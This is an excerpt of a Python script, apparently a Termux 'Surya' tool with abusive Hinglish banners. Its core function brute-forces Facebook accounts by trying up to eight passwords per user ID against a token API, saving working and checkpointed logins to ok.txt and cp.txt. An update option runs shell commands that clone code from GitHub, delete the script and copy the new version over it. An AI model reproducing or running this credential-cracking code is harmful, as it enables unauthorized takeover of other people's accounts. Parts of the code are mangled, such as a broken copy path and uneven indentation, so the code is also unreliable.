...
██████╔╝╚██████╔╝██║░░██║░░░██║░░░██║░░██║
╚═════╝░░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝
#AUTHOR : W||N'X ROY (H4T3RX K3 JIJU XD)
#OPEN SOURCE :)
#H4T3RX KI G4ND FH4DN3 W4L4 SURY4 ] :)
...
def main():
	...
	print("\033[96;1m  [J] JOIN MR. SURY4 \033[92;1m✘\033[91;1m✘")
...
def log_sel():
	...
	if sel == "":
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/wiinx.roy.1"])
		main()
	elif sel =="3" or sel =="03":
		import os
		try:
			os.system("git clone https://github.com/Wiinx/Surya")
			os.system("rm -rf surya.py")
			os.system("cp -f wiinx/surya.py \\.")
			os.system("rm -rf surya")
			xox("\033[92;1m\n TOOL UPDATE SUCCESSFUL BY SURY4:)\n")
			time.sleep(2)
			main()
		except KeyboardInterrupt:
			print("\033[91;1m\n BSDK TERE DEVICE ME SUPPORT NAHI KAREGA!\n")
	        	main()
	elif sel =="4" or sel =="04" or sel =="J" or sel =="j":
		subprocess.check_output(["am", "start", "https://github.com/Wiinx/Surya"])
		main()
	elif sel =="0" or sel =="00":
		xox("\n\t\033[91;1m CHL0 BY NEXT TIME FIRSE ANA :)")
		sys.exit()
	else:
		print("")
...
def menu():
    ...
    try:
        ...
        logo()
        print("")
        print("\033[91;1m     DUSRA TOKEN DAL YE EXPIRED HO GYA")
        os.system("rm -rf vau_token.txt")
        print("")
        time.sleep(1)
        main()
...
def crack_select1():
	...
	print("\033[92;1m  CH4L M0J K4R BRUT3 ST4RT H0 GY4\x1b[0m")
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				print(" \033[1;32m[SURY4-0K-ID] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in data.json()['error_msg']:
					print(" \033[1;33m[SURY4-CH3CKP0INT-ID] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					data = requests.get(api, params=params, headers=headers_)
					if "access_token" in data.text and "EAAA" in data.text:
						print(" \033[1;32m[SURY4-0K-ID] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in data.json()['error_msg']:
							print(" \033[1;33m[SURY4-CH3CKP0INT-ID] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							data = requests.get(api, params=params, headers=headers_)
							if "access_token" in data.text and "EAAA" in data.text:
								print(" \033[1;32m[SURY4-0K-ID] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in data.json()['error_msg']:
									print(" \033[1;33m[SURY4-CH3CKP0INT-ID] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									data = requests.get(api, params=params, headers=headers_)
									if "access_token" in data.text and "EAAA" in data.text:
										print(" \033[1;32m[SURY4-0K-ID] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in data.json()['error_msg']:
											print(" \033[1;33m[SURY4-CH3CKP0INT-ID] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											data = requests.get(api, params=params, headers=headers_)
											if "access_token" in data.text and "EAAA" in data.text:
												print(" \033[1;32m[SURY4-0K-ID] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in data.json()['error_msg']:
													print(" \033[1;33m[SURY4-CH3CKP0INT-ID] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													data = requests.get(api, params=params, headers=headers_)
													if "access_token" in data.text and "EAAA" in data.text:
														print(" \033[1;32m[SURY4-0K-ID] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in data.json()['error_msg']:
															print(" \033[1;33m[SURY4-CH3CKP0INT-ID] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															data = requests.get(api, params=params, headers=headers_)
															if "access_token" in data.text and "EAAA" in data.text:
																print(" \033[1;32m[SURY4-0K-ID] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	print(" \033[1;33m[SURY4-CH3CKP0INT-ID] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	...
																	data = requests.get(api, params=params, headers=headers_)
																	if "access_token" in data.text and "EAAA" in data.text:
																		print(" \033[1;32m[SURY4-OK-ID] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			print(" \033[1;33m[SURY4-CH3VKP0INT-ID] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
